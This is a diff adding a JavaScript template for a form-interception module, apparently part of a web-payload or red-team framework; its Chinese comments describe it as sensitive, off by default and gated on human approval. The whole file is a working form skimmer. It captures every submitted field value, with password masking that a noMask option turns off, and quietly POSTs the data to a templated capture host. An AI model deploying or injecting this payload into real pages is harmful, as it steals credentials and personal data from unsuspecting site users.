@@ -1,0 +1,55 @@
+// formhook.js.tmpl — 表單攔截模組（敏感：預設關閉，arming 需 HITL 核准）。
+//
+// 攔提交事件，記錄欄位名與欄位值。密碼欄位預設打碼（值換成固定長度標記），
+// 只在 payload 建立時另選 noMask 選項才收原值 —— 這個選項本身也要過 HITL。
+// 每個 payload 每個表單只報一次，避免重複灌爆 capture 佇列。
+(function () {
+  "use strict";
+  var TOKEN = {{ .Token | printf "%q" }};
+  var BASE = {{ .CaptureBase | printf "%q" }};
+  var MAX = {{ .MaxBytes }};
+  var NO_MASK = {{ .FormHookNoMask }};
+
+  var seen = Object.create(null);
+
+  function mask(type, value) {
+    if (NO_MASK || value === "") return value;
+    // 密碼型欄位一律打碼；其餘欄位超過 256 字截斷。
+    if (type === "password") return "<masked:" + value.length + ">";
+    return value.length > 256 ? value.slice(0, 256) + "…" : value;
+  }
+
+  function harvest(form) {
+    var parts = [];
+    var els = form.elements || [];
+    for (var i = 0; i < els.length; i++) {
+      var el = els[i];
+      if (!el || !el.name) continue;
+      var t = (el.type || "text").toLowerCase();
+      if (t === "submit" || t === "button" || t === "file") continue;
+      parts.push(el.name + "=" + mask(t, el.value || ""));
+    }
+    return parts.join("&");
+  }
+
+  function report(form, kv) {
+    var key = form.action + "|" + form.method;
+    if (seen[key]) return; // 同一表單只報一次
+    seen[key] = 1;
+    var body = "kind=formhook&action=" + encodeURIComponent(form.action || "") +
+      "&method=" + encodeURIComponent(form.method || "") +
+      "&fields=" + encodeURIComponent(kv);
+    if (body.length > MAX) body = body.slice(0, MAX);
+    var x = new XMLHttpRequest();
+    x.open("POST", BASE + "/" + TOKEN, true);
+    x.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    x.send(body);
+  }
+
+  document.addEventListener("submit", function (e) {
+    try {
+      var form = e.target;
+      if (form && form.elements) report(form, harvest(form));
+    } catch (err) { /* 目標頁的錯誤不外洩也不中斷目標頁 */ }
+  }, true);
+})();
